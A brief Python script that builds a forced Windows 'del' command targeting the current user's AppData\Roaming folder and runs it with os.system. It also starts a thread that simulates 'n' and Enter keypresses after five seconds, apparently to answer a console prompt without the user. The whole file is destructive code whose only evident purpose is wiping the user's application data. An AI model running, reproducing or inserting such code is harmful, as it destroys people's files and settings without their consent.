import os, getpass as gp
from time import sleep
import keyboard
import pydirectinput as di
import threading
user = gp.getuser()
ph = 'del /f'
mv = ph
mv += ' "C:\\Users\\'
mv += user
mv += '\\AppData\\Roaming"'
print(mv)
threads = []
def nEnter():
    sleep(5)
    di.press('n')
    di.press('enter')
for n in range(1):
    t = threading.Thread(target=nEnter)
    t.daemon = True
    threads.append(t)
    threads[n].start()
os.system(mv)
